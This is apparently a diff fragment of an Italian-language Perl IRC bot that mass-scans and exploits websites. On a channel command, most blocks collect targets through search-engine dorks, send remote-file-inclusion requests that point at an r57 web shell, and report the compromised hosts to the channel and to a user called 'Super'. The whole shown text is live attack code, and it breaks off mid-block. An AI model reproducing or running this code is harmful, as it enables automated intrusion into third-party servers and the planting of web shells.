+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleUk");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleUk");
+}}}
+}}
+exit;
+}}
+ 
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @gdelist=&gde($chiave);
+push ( my @tot, @gdelist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleDe7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9GoogleDe Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13GoogleDe Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleDe");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleDe");
+}}}
+}}
+exit;
+}}
+ 
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @gnllist=&gnl($chiave);
+push ( my @tot, @gnllist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleNl7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9GoogleNl Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13GoogleNl Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleNl");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleNl");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @gitlist=&git($chiave);
+push ( my @tot, @gitlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleIt7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9GoogleIt Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13GoogleIt Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleIt");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleIt");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @gatlist=&gat($chiave);
+push ( my @tot, @gatlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleAt7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9GoogleAt Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13GoogleAt Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleAt");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleAt");
+}}}
+}}
+exit;
+}}
+ 
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @geslist=&ges($chiave);
+push ( my @tot, @geslist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleEs7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9GoogleEs Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13GoogleEs Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleEs");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleEs");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @glist=&googlet($chiave);
+push ( my @tot, @glist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Google7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Google Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Google Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Google");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Google");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @lyclist=&lycos($chiave);
+push ( my @tot, @lyclist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Lycos7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Lycos Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Lycos Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Lycos");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Lycos");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @eurolist=&euro($chiave);
+push ( my @tot, @eurolist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Special7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Special Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Special Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Special");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Special");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @hotlist=&altacom($chiave);
+push ( my @tot, @hotlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Altacom7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Altacom Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Altacom Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltaCom");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltaCom");
+}}
+}}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @search2list=&altavistade($chiave);
+push ( my @tot, @search2list );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13AltavistaDe7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9AltavistaDe Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13AltavistaDe Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaDe");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaDe");
+}}
+}}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @searchlist=&altavistaus($chiave);
+push ( my @tot, @searchlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13AltavistaUs7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9AltavistaUs Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13AltavistaUs Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaUs");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaUs");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaUs");
+}}
+}}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @ask2=&ask($chiave);
+push ( my @tot, @ask2 );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Ask27:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Ask2 Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Ask2 Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ask2");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ask2");
+}}
+}}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @powlist=&powersearch($chiave);
+push ( my @tot, @powlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13PowerSearch7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9PowerSearch Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13PowerSearch Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su PowerSearch");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su PowerSearch");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @allist=&alltheweb($chiave);
+push ( my @tot, @allist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Alltheweb7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Alltheweb Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Alltheweb Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Alltheweb");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Alltheweb");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @virglist=&virgilio($chiave);
+push ( my @tot, @virglist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Virgilio7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Virgilio Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Virgilio Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
